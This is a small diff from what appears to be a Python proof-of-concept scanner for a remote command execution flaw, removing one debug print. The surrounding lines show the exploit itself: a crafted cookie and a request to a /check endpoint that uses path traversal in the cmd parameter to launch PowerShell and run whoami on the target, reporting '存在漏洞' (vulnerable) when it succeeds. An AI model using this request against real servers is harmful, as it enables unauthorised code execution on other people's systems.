@@ -82,7 +82,6 @@ def _Rce(urls):
 				"Cookie": "CID ="  + verify_string
 			}
 			poc2 = 'http://' + urls + '/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+whoami'
-			print(verify_string)
 			rec2 = requests.get(poc2, headers=headers2, verify=False)
 			if rec2.status_code == 200:
 				print('[ * ] 存在漏洞 ' + urls + '------' + rec2.text)
